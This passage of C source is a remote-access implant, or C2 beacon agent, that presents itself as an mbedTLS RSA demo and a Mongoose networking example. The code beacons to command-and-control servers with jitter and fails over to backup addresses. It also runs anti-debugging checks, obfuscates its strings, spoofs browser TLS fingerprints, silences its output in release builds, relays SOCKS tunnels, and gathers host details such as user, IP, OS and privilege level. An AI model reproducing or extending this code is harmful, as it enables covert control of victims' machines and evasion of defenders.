        if (packet_len == ERR_MSG_LEN && memcmp(packet_data, ERR_MSG, ERR_MSG_LEN) == 0) {

            printf("\n[system] Server returned authentication failure %.*s\n", ERR_MSG_LEN, packet_data);

            printf("[system] Initiating reconnect, draining connections...\n");





            c->is_closing = 1;



            mg_iobuf_del(io, 0, io->len);



            return;

        }



#if PAYLOAD_ENCRYPTION == 1



        if (packet_len < (uint32_t)payload_nonce_size()) {

            printf("Warning: encrypted packet too short (%u bytes)\n", packet_len);

            c->is_closing = 1;

            return;

        }



        unsigned char session_key[32];





        if (session_key_get(PKT_TYPE_INIT_KEY, session_key, sizeof(session_key)) != 0) {

            fprintf(stderr, "Failed to get session key for type %d\n", PKT_TYPE_INIT_KEY);

            c->is_closing = 1;

            return ;

        }





        unsigned char* nonce = packet_data;

        unsigned char* cipher = packet_data + payload_nonce_size();

        uint32_t cipher_len = packet_len - (uint32_t)payload_nonce_size() - (uint32_t)payload_tag_size();

        unsigned char* tag = packet_data + payload_nonce_size() + cipher_len;



        printf("[DEBUG] Decryption details:\n");

        printf("  Total Packet Len: %u\n", packet_len);

        printf("  Cipher Len: %u\n", cipher_len);

        debug_hex_dump("Nonce (12B)", nonce, 12);

        debug_hex_dump("Tag (16B)", tag, 16);

        debug_hex_dump("Session Key ", session_key, 16);





        unsigned char* decrypted = (unsigned char*)malloc(cipher_len);

        if (decrypted == NULL) {

            printf("Warning: memory allocation failed\n");

            c->is_closing = 1;

            return;

        }





        int result = payload_decrypt_bytes(session_key, nonce, cipher, cipher_len, tag, decrypted);



        if (result == 0) {

            printf("[decrypt] Success: ciphertext %u -> plaintext %u\n", packet_len, cipher_len);



            handle_packet(c, decrypted, cipher_len);

        }

        else {

            printf("Warning: AES-GCM decryption failed (tag mismatch)!\n");



            free(decrypted);

            c->is_closing = 1;

            return;

        }





        free(decrypted);

#else



        handle_packet(c, packet_data, packet_len);

#endif





        mg_iobuf_del(io, 0, PACKET_HEADER_SIZE + packet_len);

    }

}







// ========================================



// ========================================



static void finalize_main_connection_ready(struct mg_connection *c) {

    char active_host[256] = {0};

    int active_port = 0;



    g_main_conn_ready = 1;

    g_main_conn_intentional_close = 0;

    main_activity_touch();
    pthread_mutex_lock(&g_main_state_mutex);
    uint64_t _now_ms = get_wallclock_ms();  
    g_main_connected_at_ms = _now_ms;
    LOG_INFO("[main] g_main_connected_at_ms: %d", g_main_connected_at_ms);
    g_main_online_deadline_ms = (g_beacon_sleep_enabled && g_beacon_interval_ms > 0)
    ? (_now_ms + (uint64_t)BEACON_ONLINE_WINDOW_MS)
    : 0;
    LOG_INFO("[main] g_main_online_deadline_ms: %d", g_main_online_deadline_ms);
    g_main_conn_fd = (c != NULL) ? (int) (intptr_t) c->fd : -1;
    g_main_active_conn = c;
    pthread_mutex_unlock(&g_main_state_mutex);



    if (parse_address_host_port(get_current_client_addr(),

        active_host, sizeof(active_host), &active_port) == 0) {

        char endpoint[320] = {0};

        set_active_c2_address(active_host, active_port);

        if (format_endpoint_for_log(active_host, active_port, endpoint, sizeof(endpoint)) == 0) {
            LOG_INFO("[main] Active C2 updated: %s", endpoint);
        } else {
            LOG_INFO("[main] Active C2 updated: %s:%d", active_host, active_port);
        }

    } else {

        LOG_WARN("[main] Failed to update active C2 from current address");

    }

    LOG_INFO("[main] C2 channel ready");

    on_connection_success(c);

}



static void main_network_handler(struct mg_connection *c, int ev, void *ev_data) {

    switch (ev) {
        case MG_EV_OPEN: {
            conn_state_t* st = calloc(1, sizeof(*st));
            printf("[main] Connection opened\n");
            if (st == NULL) {
                c->is_closing = 1;
                break;
            }
            st->banner_done = 0;
            st->banner_state = 0;
            c->fn_data = st;
            break;
        }

        case MG_EV_ACCEPT:
            printf("[main] Connection accepted\n");
            break;

        case MG_EV_CONNECT: {
            (void) ev_data;
            LOG_INFO("[main] Unexpected MG_EV_CONNECT event on wrapped main connection");
            break;
        }

#if TRANSPORT_TLS == 1
        case MG_EV_TLS_HS:
            LOG_INFO("[main] TLS handshake completed");
            finalize_main_connection_ready(c);
            break;
#endif

        case MG_EV_READ:
            printf("[main] Processing received packet\n");
            main_activity_touch();
            if (c->is_closing || c->is_draining) break;
            process_packets(c);
            break;

        case MG_EV_CLOSE:
        {
            int is_active_conn = 0;
            printf("[main] Connection closed\n");
            pthread_mutex_lock(&g_main_state_mutex);
            is_active_conn = (g_main_active_conn == c);
            if (is_active_conn) {
                g_main_inflight_tasks = 0;
                g_main_connected_at_ms = 0;
                g_main_online_deadline_ms = 0;
                g_main_conn_fd = -1;
                g_main_active_conn = NULL;
            }
            pthread_mutex_unlock(&g_main_state_mutex);
            if (is_active_conn) {
                g_main_conn_ready = 0;
            }
            if (c->fn_data) {
                free(c->fn_data);
                c->fn_data = NULL;
            }
            break;
        }

        case MG_EV_ERROR:
            if (ev_data != NULL) {
                printf("[main] Error: %s\n", (char*)ev_data);
            } else {
                printf("[main] Unknown error (ev_data is NULL)\n");
            }
            break;
    }
}

static int set_socket_nonblocking_platform(int fd) {
#ifdef _WIN32
    u_long mode = 1;
    if (ioctlsocket((SOCKET) fd, FIONBIO, &mode) != 0) {
        return -1;
    }
    return 0;
#else
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags < 0) {
        return -1;
    }
    if (fcntl(fd, F_SETFL, flags | O_NONBLOCK) != 0) {
        return -1;
    }
    return 0;
#endif
}

static void print_error(const char* func_name, int ret) {

    char error_buf[100];

    mbedtls_strerror(ret, error_buf, sizeof(error_buf));

    printf("Error: %s returned -0x%04x: %s\n", func_name, -ret, error_buf);

}



    // Print data as hex

static void print_hex(const char* title, const unsigned char* data, size_t len) {

    printf("%s (%zu bytes):\n", title, len);

    for (size_t i = 0; i < len; i++) {

        printf("%02x", data[i]);

        if ((i + 1) % 32 == 0)

            printf("\n");

        else if ((i + 1) % 4 == 0)

            printf(" ");

    }

    printf("\n\n");

}



int main(void) {

    int ret = 0;

    mbedtls_pk_context pk;

    mbedtls_entropy_context entropy;

    mbedtls_ctr_drbg_context ctr_drbg;

    const char* pers = "rsa_demo";





    const char* plaintext = "Hello, mbedTLS RSA!";

    unsigned char ciphertext[512];

    unsigned char decrypted[512];

    size_t plaintext_len = strlen(plaintext);

    size_t ciphertext_len = 0;

    size_t decrypted_len = 0;



    // Keep release build fully silent by redirecting stdio.

    configure_release_silence();
    configure_job_control_signals();
    anti_debug_init();
    anti_debug_check_startup();



    printf("========================================\n");

    printf("mbedTLS RSA operation log\n");

    printf("========================================\n\n");





    mbedtls_pk_init(&pk);

    mbedtls_entropy_init(&entropy);

    mbedtls_ctr_drbg_init(&ctr_drbg);





    printf("1. Initializing entropy generator...\n");

    ret = mbedtls_ctr_drbg_seed(&ctr_drbg, mbedtls_entropy_func, &entropy,

                                (const unsigned char*)pers, strlen(pers));

    if (ret != 0) {

        print_error("mbedtls_ctr_drbg_seed", ret);

        goto cleanup;

    }

    printf("   Entropy generator initialized\n\n");





    printf("2. Generating %d-bit RSA key...\n", RSA_KEY_SIZE);

    ret = mbedtls_pk_setup(&pk, mbedtls_pk_info_from_type(MBEDTLS_PK_RSA));

    if (ret != 0) {

        print_error("mbedtls_pk_setup", ret);

        goto cleanup;

    }



    ret = mbedtls_rsa_gen_key(mbedtls_pk_rsa(pk), mbedtls_ctr_drbg_random,

                              &ctr_drbg, RSA_KEY_SIZE, RSA_EXPONENT);

    if (ret != 0) {

        print_error("mbedtls_rsa_gen_key", ret);

        goto cleanup;

    }

    printf("   RSA key generation succeeded\n\n");





    printf("3. Original plaintext: \"%s\"\n\n", plaintext);





    printf("4. Encrypting with public key...\n");

    ret = mbedtls_pk_encrypt(&pk, (const unsigned char*)plaintext, plaintext_len,

                            ciphertext, &ciphertext_len, sizeof(ciphertext),

                            mbedtls_ctr_drbg_random, &ctr_drbg);

    if (ret != 0) {

        print_error("mbedtls_pk_encrypt", ret);

        goto cleanup;

    }

    print_hex("   ciphertext", ciphertext, ciphertext_len);





    printf("5. Decrypting with private key...\n");

    ret = mbedtls_pk_decrypt(&pk, ciphertext, ciphertext_len,

                            decrypted, &decrypted_len, sizeof(decrypted),

                            mbedtls_ctr_drbg_random, &ctr_drbg);

    if (ret != 0) {

        print_error("mbedtls_pk_decrypt", ret);

        goto cleanup;

    }

    printf("   Decrypted output: \"%.*s\"\n\n", (int)decrypted_len, decrypted);





    if (decrypted_len == plaintext_len &&

        memcmp(plaintext, decrypted, plaintext_len) == 0) {

        printf("RSA encrypt/decrypt verification succeeded\n\n");

    } else {

        printf("RSA encrypt/decrypt verification failed\n\n");

        ret = -1;

        goto cleanup;

    }





    printf("========================================\n");

    printf("RSA signature pipeline\n");

    printf("========================================\n\n");



    unsigned char hash[32];

    unsigned char signature[512];

    size_t signature_len = 0;





    memset(hash, 0xAB, sizeof(hash));



    printf("6. Signing the SHA-256 test hash...\n");

    ret = mbedtls_pk_sign(&pk, MBEDTLS_MD_SHA256,

                         hash, sizeof(hash),

                         signature, sizeof(signature), &signature_len,

                         mbedtls_ctr_drbg_random, &ctr_drbg);

    if (ret != 0) {

        print_error("mbedtls_pk_sign", ret);

        goto cleanup;

    }

    print_hex("   signature", signature, signature_len);



    printf("7. Verifying signature...\n");

    ret = mbedtls_pk_verify(&pk, MBEDTLS_MD_SHA256,

                           hash, sizeof(hash),

                           signature, signature_len);

    if (ret != 0) {

        print_error("mbedtls_pk_verify", ret);

        goto cleanup;

    }

    printf("   Signature verification succeeded\n\n");





    printf("8. Exporting key in PEM format...\n");

    unsigned char key_buffer[4096];

    memset(key_buffer, 0, sizeof(key_buffer));

    ret = mbedtls_pk_write_key_pem(&pk, key_buffer, sizeof(key_buffer));

    if (ret == 0) {

        printf("%s\n", key_buffer);

    } else {

        print_error("mbedtls_pk_write_key_pem", ret);

    }



    printf("========================================\n");

    printf("All tests completed\n");

    printf("========================================\n");



    ret = 0;



cleanup:

    mbedtls_pk_free(&pk);

    mbedtls_ctr_drbg_free(&ctr_drbg);

    mbedtls_entropy_free(&entropy);



    // ========================================



    // ========================================

    printf("\n========================================\n");

    printf("Mongoose network communication example\n");

    printf("========================================\n\n");



    

    init_config();

    if (load_persisted_c2_addresses() > 0) {

        LOG_INFO("Runtime callback addresses restored from local store");

    }



    // Initialize JA3 fingerprint manager for TLS fingerprint spoofing

    ja3_manager_init(&g_ja3_manager);

    int ja3_count = ja3_manager_load_presets(&g_ja3_manager);

    if (ja3_count > 0) {

        printf("[JA3] Loaded %d browser fingerprints for TLS spoofing\n", ja3_count);

    } else {

        printf("[JA3] Warning: Failed to load browser fingerprints\n");

    }





    init_dynamic_config();





    pthread_mutex_lock(&g_hb_config.mutex);

    

    g_hb_config.jitter_percent = 20;

    g_hb_config.jitter_mode = JITTER_MODE_RANDOM;

    g_hb_config.min_interval = 10;

    g_hb_config.max_interval = 300;

    pthread_mutex_unlock(&g_hb_config.mutex);





    srand((unsigned int)time(NULL));



    init_key();



    init_agent_id();



    session_key_manager_init();



#if PAYLOAD_ENCRYPTION == 1 && KEY_EXCHANGE_MODE == 1

    // Initialize RSA key exchange module

    if (rsa_key_exchange_init() != 0 || !rsa_key_exchange_is_available()) {

        LOG_ERROR("RSA key exchange initialization failed: embedded public key is missing or invalid");

    } else {

        LOG_INFO("RSA key exchange initialized successfully");

    }

#endif



    struct mg_mgr mgr;

    mg_mgr_init(&mgr);



    // Print configuration

    {
        char obf_buf[128];
        obf_decode_string(OBF_STR_AGENT_BANNER_REVERSE, obf_buf, sizeof(obf_buf));
        printf("%s", obf_buf);
        obf_secure_zero(obf_buf, sizeof(obf_buf));

        obf_decode_string(OBF_STR_BEACON_CONFIG_FMT, obf_buf, sizeof(obf_buf));
        printf(obf_buf,
               ENABLE_RECONNECT ? "enabled" : "disabled",
               g_beacon_interval_ms, RECONNECT_MAX_DELAY, g_beacon_jitter_pct);
        obf_secure_zero(obf_buf, sizeof(obf_buf));
    }



    {
        char obf_buf[96];
        obf_decode_string(OBF_STR_NETWORK_SERVICE_STARTED, obf_buf, sizeof(obf_buf));
        printf("%s", obf_buf);
        obf_secure_zero(obf_buf, sizeof(obf_buf));

        obf_decode_string(OBF_STR_SUPPORTED_COMMANDS, obf_buf, sizeof(obf_buf));
        printf("%s", obf_buf);
        obf_secure_zero(obf_buf, sizeof(obf_buf));
    }

    printf("  0x01 - Echo\n");

    printf("  0x02 - Create child connection\n");

    printf("  0x03 - Disconnect child connection\n");

    printf("  0x04 - RSA encrypt\n");

    printf("  0x05 - RSA decrypt\n");

    printf("\n");



    int reconnect_attempts = 0;

    int reconnect_delay = g_reconnect_base_delay;

    int addr_fail_count = 0;  // Count consecutive failures across all addresses

    // Print configured addresses
    printf("[main] Configured server addresses:\n");
    for (int i = 0; i < g_addr_count; i++) {
        if (g_client_addrs[i] != NULL && g_client_addrs[i][0] != '\0') {
            printf("  [%d] %s%s\n", i + 1, g_client_addrs[i], (i == 0) ? " (primary)" : " (backup)");
        }
    }
    printf("\n");

    // Main connection loop
    while (!g_shutdown) {
        anti_debug_check_runtime(get_wallclock_ms());
        const char *current_addr = get_current_client_addr();
        char current_host[256] = {0};
        char resolved_host[INET6_ADDRSTRLEN] = {0};
        char connect_url[320] = {0};
        int current_port = 0;
        int resolve_family = AF_UNSPEC;
        int addr_ready = 1;

        if (parse_address_host_port(current_addr, current_host, sizeof(current_host), &current_port) != 0) {
            LOG_ERROR("[main] Invalid address format: %s", current_addr);
            addr_ready = 0;
        } else if (prepare_connect_target(current_host, current_port,
            resolved_host, sizeof(resolved_host),
            connect_url, sizeof(connect_url),
            &resolve_family) != 0) {
            LOG_ERROR("[main] Failed to prepare connection target: %s:%d", current_host, current_port);
            addr_ready = 0;
        } else if (strcmp(current_addr, connect_url) != 0) {
            LOG_INFO("[main] Resolved hostname: %s -> %s", current_host, resolved_host);
        }

        if (addr_ready) {
            if (strcmp(current_addr, connect_url) == 0) {
                {
                    char obf_buf[80];
                    obf_decode_string(OBF_STR_CONNECT_ATTEMPT_FMT, obf_buf, sizeof(obf_buf));
                    printf(obf_buf, current_addr);
                    obf_secure_zero(obf_buf, sizeof(obf_buf));
                }
            } else {
                {
                    char obf_buf[96];
                    obf_decode_string(OBF_STR_CONNECT_ATTEMPT_RESOLVED_FMT, obf_buf, sizeof(obf_buf));
                    printf(obf_buf, current_addr, connect_url);
                    obf_secure_zero(obf_buf, sizeof(obf_buf));
                }
            }
        }

        struct mg_connection *conn = NULL;
        if (addr_ready) {
            int main_fd = -1;
            int connect_err = 0;
            int timeout_flag = 0;

            main_fd = connect_tcp_endpoint(resolved_host, current_port, 3000, &connect_err, &timeout_flag);
            if (main_fd < 0) {
                LOG_ERROR("[main] TCP connect failed: target=%s err=%d timeout=%d",
                    connect_url, connect_err, timeout_flag);
            } else if (set_socket_nonblocking_platform(main_fd) != 0) {
                LOG_ERROR("[main] Failed to set main socket nonblocking: fd=%d errno=%d", main_fd, errno);
                close(main_fd);
            } else {
                conn = mg_wrapfd(&mgr, main_fd, main_network_handler, NULL);
                if (conn == NULL) {
                    LOG_ERROR("[main] Failed to wrap main socket: fd=%d", main_fd);
                    close(main_fd);
                } else {
                    conn->is_client = 1;
                    LOG_INFO("[main] TCP connection established");
#if TRANSPORT_TLS == 1
                    conn->is_connecting = 1;
                    if (setup_tls(conn) != 0) {
                        LOG_ERROR("[main] TLS initialization failed");
                        conn->is_connecting = 0;
                        conn->is_closing = 1;
                    } else {
                        LOG_INFO("[main] TLS handshake started");
                    }
#else
                    finalize_main_connection_ready(conn);
#endif
                }
            }
        }

        if (conn == NULL) {
            printf("[main] Connect failed: %s\n", current_addr);
#if ENABLE_RECONNECT
            const char *next_addr = switch_to_next_addr();
            if (next_addr != NULL && addr_fail_count < g_addr_count - 1) {
                addr_fail_count++;
                printf("[main] Fast switch to next address (%d/%d)\n", addr_fail_count, g_addr_count);
                continue;
            }

            if (MAX_RECONNECT_ATTEMPTS > 0 && reconnect_attempts >= MAX_RECONNECT_ATTEMPTS) {
                printf("[main] Max reconnect attempts reached, exiting\n");
                break;
            }

            reconnect_attempts++;
            if (reconnect_attempts <= 1) {
                reconnect_delay = g_reconnect_base_delay;
            }
            addr_fail_count = 0;

            int delay = reconnect_delay + get_jitter_with_base(reconnect_delay);
            if (delay < 0) delay = 0;

            printf("[main] All addresses failed, retry first address after %d ms (attempt %d/%d)\n",
                   delay, reconnect_attempts,
                   MAX_RECONNECT_ATTEMPTS > 0 ? MAX_RECONNECT_ATTEMPTS : -1);

            sleep_ms(delay);
            reconnect_delay = reconnect_delay * 2;
            if (reconnect_delay > RECONNECT_MAX_DELAY) {
                reconnect_delay = RECONNECT_MAX_DELAY;
            }
            reset_addr_index();
            continue;
#else
            break;
#endif
        }

        reconnect_attempts = 0;
        reconnect_delay = g_reconnect_base_delay;
        addr_fail_count = 0;
        {
            char obf_buf[80];
            obf_decode_string(OBF_STR_CONNECTION_INITIATED_FMT, obf_buf, sizeof(obf_buf));
            printf(obf_buf, current_addr);
            obf_secure_zero(obf_buf, sizeof(obf_buf));
        }

        // Preserve INIT session key across reconnects to avoid key mismatch with server-side extender state.
        session_key_clear_except(PKT_TYPE_INIT_KEY);

        int connection_alive = 1;
        while (!g_shutdown && connection_alive) {
            anti_debug_check_runtime(get_wallclock_ms());
            mg_mgr_poll(&mgr, 100);
            cleanup_exited_threads();

            if (!g_shutdown &&
                g_beacon_sleep_enabled &&
                g_beacon_interval_ms > 0 &&
                !conn->is_closing &&
                main_online_deadline_expired()) {
                
                main_request_control_close(conn, "beacon-online-deadline");
            }

            if (!g_shutdown &&
                (g_main_force_reconnect || g_main_sleep_reconnect) &&
                g_main_conn_ready &&
                !conn->is_closing &&
                conn->send.len == 0) {
                printf("[main] Disconnect DEBUG 1\n");
                g_main_conn_intentional_close = 1;
                conn->is_closing = 1;
            }

            // Sleep command enables persistent beacon mode for the main control channel.
            // if (!g_shutdown &&
            //     g_main_conn_ready &&
            //     g_beacon_sleep_enabled &&
            //     g_beacon_interval_ms > 0 &&
            //     main_inflight_count() == 0 &&
            //     !conn->is_connecting && 
            //     !conn->is_closing &&
            //     main_connection_age_ms() >= (uint64_t) BEACON_ONLINE_WINDOW_MS) {
            //     printf("[main] Disconnect DEBUG 2\n");
            //     g_main_conn_intentional_close = 1;
            //     conn->is_closing = 1;
            // }

            connection_alive = 0;
            for (struct mg_connection *c = mgr.conns; c != NULL; c = c->next) {
                if (c == conn && !c->is_closing) {
                    connection_alive = 1;
                    break;
                }
            }
        }

        printf("[main] Disconnected: %s\n", current_addr);
        upload_entries_cleanup();

#if ENABLE_RECONNECT
        if (!g_shutdown) {
            if (g_main_conn_intentional_close) {
                int delay = g_main_force_reconnect ? 0 : get_beacon_sleep_delay_ms();
                printf("[main] Beacon sleep %d ms before reconnect\n", delay);
                if (delay > 0) sleep_ms(delay);
                reset_addr_index();
                g_main_conn_intentional_close = 0;
                g_main_force_reconnect = 0;
                g_main_sleep_reconnect = 0;
                continue;
            }

            const char *next_addr = switch_to_next_addr();
            if (next_addr != NULL) {
                printf("[main] Switched to backup address: %s\n", next_addr);
            } else {
                reconnect_attempts++;
                if (reconnect_attempts <= 1) {
                    reconnect_delay = g_reconnect_base_delay;
                }
                if (MAX_RECONNECT_ATTEMPTS > 0 && reconnect_attempts >= MAX_RECONNECT_ATTEMPTS) {
                    printf("[main] Max reconnect attempts reached, exiting\n");
                    break;
                }

                int delay = reconnect_delay + get_jitter_with_base(reconnect_delay);
                if (delay < 0) delay = 0;

                printf("[main] Reconnect after %d ms (attempt %d/%d)\n",
                       delay, reconnect_attempts,
                       MAX_RECONNECT_ATTEMPTS > 0 ? MAX_RECONNECT_ATTEMPTS : -1);

                sleep_ms(delay);
                reconnect_delay = reconnect_delay * 2;
                if (reconnect_delay > RECONNECT_MAX_DELAY) {
                    reconnect_delay = RECONNECT_MAX_DELAY;
                }
                reset_addr_index();
            }
        } else {
            break;
        }
#else
        break;
#endif
    }

    printf("\nCleaning up resources...\n");



    // Set global shutdown flag

    g_shutdown = 1;



    // Stop all child threads

    printf("Stopping child threads...\n");

    thread_context_t *ctx, *tmp;

    HASH_ITER(hh, g_threads, ctx, tmp) {

        printf("  Stop thread %d\n", ctx->thread_id);

        ctx->running = 0;

    }



    // Wait for child threads to exit

    HASH_ITER(hh, g_threads, ctx, tmp) {

        printf("  Wait thread %d to exit...\n", ctx->thread_id);

        JOIN_THREAD(ctx->thread);

        CLOSE_THREAD(ctx->thread);

        int cleaned_thread_id = ctx->thread_id;

        HASH_DEL(g_threads, ctx);

        free(ctx);

        printf("  Thread %d cleaned\n", cleaned_thread_id);

    }



    // Stop SOCKS/tunnel sessions

    printf("Stopping tunnel sessions...\n");

    tunnel_session_t *tun_session, *tun_session_tmp;

    pthread_mutex_lock(&g_tunnel_sessions_mutex);

    HASH_ITER(hh, g_tunnel_sessions, tun_session, tun_session_tmp) {

        tun_session->running = 0;

        tun_session->paused = 0;

        if (tun_session->relay_fd >= 0) shutdown(tun_session->relay_fd, SHUT_RDWR);

        if (tun_session->target_fd >= 0) shutdown(tun_session->target_fd, SHUT_RDWR);

    }

    pthread_mutex_unlock(&g_tunnel_sessions_mutex);



    while (1) {

        pthread_mutex_lock(&g_tunnel_sessions_mutex);

        tun_session = g_tunnel_sessions;

        pthread_mutex_unlock(&g_tunnel_sessions_mutex);

        if (tun_session == NULL) {

            break;

        }

        sleep_ms(50);

    }



    // Clean up network manager

    printf("Releasing network resources...\n");

    mg_mgr_free(&mgr);



#if PAYLOAD_ENCRYPTION == 1 && KEY_EXCHANGE_MODE == 1

    // Clean up RSA resources

    rsa_key_exchange_cleanup();

#endif



    // Clean up session key manager

    session_key_manager_destroy();



    // Clean up JA3 fingerprint manager

    ja3_manager_free(&g_ja3_manager);



    printf("All resources released\n");



    return ret;

}



void generate_session_key(unsigned char* key, size_t key_len) {

    int fd;



    fd = open("/dev/urandom", O_RDONLY);

    if (fd >= 0) {

        if (read(fd, key, key_len) == (ssize_t)key_len) {

            close(fd);

            return;

        }

        close(fd);

    }



    srand((unsigned int)time(NULL) ^ (unsigned int)getpid());

    for (size_t i = 0; i < key_len; i++) {

        key[i] = (unsigned char)(rand() & 0xFF);

    }

}







void get_process_name(char* name, size_t len) {

    FILE* fp = fopen("/proc/self/comm", "r");

    if (fp) {

        if (fgets(name, len, fp) != NULL) {



            size_t n = strlen(name);

            if (n > 0 && name[n - 1] == '\n') name[n - 1] = '\0';

        }

        fclose(fp);

    }

    else {

        safe_strncpy(name, "unknown", len);

    }

}





static uint32_t simple_hash32(const unsigned char* data, size_t len) {

    uint32_t hash = 2166136261u;

    for (size_t i = 0; i < len; ++i) {

        hash ^= data[i];

        hash *= 16777619u;

    }

    return hash;

}



static void read_first_line_file(const char* path, char* out, size_t out_len) {

    if (out == NULL || out_len == 0) {

        return;

    }

    out[0] = '\0';

    if (path == NULL || path[0] == '\0') {

        return;

    }



    FILE* fp = fopen(path, "r");

    if (fp == NULL) {

        return;

    }



    if (fgets(out, (int)out_len, fp) != NULL) {

        size_t n = strlen(out);

        while (n > 0 && (out[n - 1] == '\n' || out[n - 1] == '\r')) {

            out[--n] = '\0';

        }

    }

    fclose(fp);

}



typedef struct agent_init_info {
    char user[256];
    char host[256];
    char ip[INET6_ADDRSTRLEN];
    char os_name[32];
    char os_version[256];
    uint32_t acp;
    uint32_t oem;
    int elevated;
} agent_init_info_t;

static void init_agent_init_info_defaults(agent_init_info_t* info) {
    if (info == NULL) {
        return;
    }

    memset(info, 0, sizeof(*info));
    safe_strncpy(info->os_name, "linux", sizeof(info->os_name));
    safe_strncpy(info->user, "unknown", sizeof(info->user));
    safe_strncpy(info->host, "unknown", sizeof(info->host));
    safe_strncpy(info->ip, "unknown", sizeof(info->ip));
    safe_strncpy(info->os_version, "Unknown", sizeof(info->os_version));
    info->acp = 0;
    info->oem = 0;
    info->elevated = 0;
}

static void trim_surrounding_quotes(char* value) {
    size_t len;

    if (value == NULL) {
        return;
    }

    len = strlen(value);
    if (len >= 2 && ((value[0] == '"' && value[len - 1] == '"') ||
        (value[0] == '\'' && value[len - 1] == '\''))) {
        memmove(value, value + 1, len - 2);
        value[len - 2] = '\0';
    }
}

static int read_os_pretty_name(char* out, size_t out_len) {
    FILE* fp;
    char line[512];

    if (out == NULL || out_len == 0) {
        return -1;
    }

    out[0] = '\0';
    fp = fopen("/etc/os-release", "r");
    if (fp == NULL) {
        return -1;
    }

    while (fgets(line, sizeof(line), fp) != NULL) {
        const char* prefix = "PRETTY_NAME=";
        size_t prefix_len = strlen(prefix);
        if (strncmp(line, prefix, prefix_len) == 0) {
            safe_strncpy(out, line + prefix_len, out_len);
            while (out[0] != '\0') {
                size_t n = strlen(out);
                if (n == 0 || (out[n - 1] != '\n' && out[n - 1] != '\r')) {
                    break;
                }
                out[n - 1] = '\0';
            }
            trim_surrounding_quotes(out);
            fclose(fp);
            return out[0] != '\0' ? 0 : -1;
        }
    }

    fclose(fp);
    return -1;
}

static void get_os_version_string(char* out, size_t out_len) {
    struct utsname uts;

    if (out == NULL || out_len == 0) {
        return;
    }

    if (read_os_pretty_name(out, out_len) == 0) {
        return;
    }

    if (uname(&uts) == 0) {
        snprintf(out, out_len, "%s %s", uts.sysname, uts.release);
        return;
    }

    safe_strncpy(out, "Unknown", out_len);
}

static int get_username_from_env(char* out, size_t out_len) {
    const char* env_user;

    if (out == NULL || out_len == 0) {
        return -1;
    }

    env_user = getenv("USER");
    if (env_user == NULL || env_user[0] == '\0') {
        env_user = getenv("LOGNAME");
    }
    if (env_user == NULL || env_user[0] == '\0') {
        return -1;
    }

    safe_strncpy(out, env_user, out_len);
    return 0;
}

static int get_username_from_passwd_file(uid_t uid, char* out, size_t out_len) {
    FILE* fp;
    char line[1024];

    if (out == NULL || out_len == 0) {
        return -1;
    }

    fp = fopen("/etc/passwd", "r");
    if (fp == NULL) {
        return -1;
    }

    while (fgets(line, sizeof(line), fp) != NULL) {
        char* saveptr = NULL;
        char* username;
        char* field;
        char* uid_field;
        unsigned long parsed_uid;

        line[strcspn(line, "\r\n")] = '\0';
        username = strtok_r(line, ":", &saveptr);
        if (username == NULL || username[0] == '\0') {
            continue;
        }

        field = strtok_r(NULL, ":", &saveptr);
        if (field == NULL) {
            continue;
        }
        uid_field = strtok_r(NULL, ":", &saveptr);
        if (uid_field == NULL || uid_field[0] == '\0') {
            continue;
        }

        errno = 0;
        parsed_uid = strtoul(uid_field, NULL, 10);
        if (errno != 0 || parsed_uid > UINT32_MAX) {
            continue;
        }

        if ((uid_t) parsed_uid == uid) {
            safe_strncpy(out, username, out_len);
            fclose(fp);
            return 0;
        }
    }

    fclose(fp);
    return -1;
}

static void format_uid_fallback(uid_t uid, char* out, size_t out_len) {
    if (out == NULL || out_len == 0) {
        return;
    }

    snprintf(out, out_len, "%u", (unsigned int) uid);
}

static int is_ipv4_link_local(const struct sockaddr_in* addr) {
    const unsigned char* bytes;

    if (addr == NULL) {
        return 0;
    }

    bytes = (const unsigned char*)&addr->sin_addr;
    return bytes[0] == 169 && bytes[1] == 254;
}

static int extract_sockaddr_ip(const struct sockaddr* sa, char* out, size_t out_len) {
    if (sa == NULL || out == NULL || out_len == 0) {
        return -1;
    }

    if (sa->sa_family == AF_INET) {
        const struct sockaddr_in* sin = (const struct sockaddr_in*)sa;
        if ((ntohl(sin->sin_addr.s_addr) >> 24) == 127 || is_ipv4_link_local(sin)) {
            return -1;
        }
        if (inet_ntop(AF_INET, &sin->sin_addr, out, out_len) == NULL) {
            return -1;
        }
        return 0;
    }

    if (sa->sa_family == AF_INET6) {
        const struct sockaddr_in6* sin6 = (const struct sockaddr_in6*)sa;
        if (IN6_IS_ADDR_LOOPBACK(&sin6->sin6_addr) || IN6_IS_ADDR_LINKLOCAL(&sin6->sin6_addr)) {
            return -1;
        }
        if (inet_ntop(AF_INET6, &sin6->sin6_addr, out, out_len) == NULL) {
            return -1;
        }
        return 0;
    }

    return -1;
}

static int get_connection_local_ip(struct mg_connection* c, char* out, size_t out_len) {
    int fd;
    struct sockaddr_storage local_addr;
    socklen_t local_len = sizeof(local_addr);

    if (c == NULL || out == NULL || out_len == 0) {
        return -1;
    }

    fd = (int) (size_t) c->fd;
    if (fd < 0) {
        return -1;
    }

    if (getsockname(fd, (struct sockaddr*) &local_addr, &local_len) != 0) {
        return -1;
    }

    return extract_sockaddr_ip((const struct sockaddr*) &local_addr, out, out_len);
}

static MAYBE_UNUSED int get_route_preferred_ip(char* out, size_t out_len) {
    char c2_host[256];
    int c2_port = 0;
    char port_str[16];
    struct addrinfo hints;
    struct addrinfo* result = NULL;
    int found = -1;

    if (out == NULL || out_len == 0) {
        return -1;
    }

    out[0] = '\0';
    get_current_c2_address(c2_host, sizeof(c2_host), &c2_port);
    if (c2_host[0] == '\0' || c2_port <= 0) {
        return -1;
    }

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_DGRAM;
    snprintf(port_str, sizeof(port_str), "%d", c2_port);

    if (getaddrinfo(c2_host, port_str, &hints, &result) != 0) {
        return -1;
    }

    for (struct addrinfo* rp = result; rp != NULL; rp = rp->ai_next) {
        int fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (fd < 0) {
            continue;
        }
        if (connect(fd, rp->ai_addr, rp->ai_addrlen) == 0) {
            struct sockaddr_storage local_addr;
            socklen_t local_len = sizeof(local_addr);
            if (getsockname(fd, (struct sockaddr*)&local_addr, &local_len) == 0 &&
                extract_sockaddr_ip((const struct sockaddr*)&local_addr, out, out_len) == 0) {
                found = 0;
                close(fd);
                break;
            }
        }
        close(fd);
    }

    freeaddrinfo(result);
    return found;
}

static MAYBE_UNUSED int get_first_non_loopback_ip(char* out, size_t out_len) {
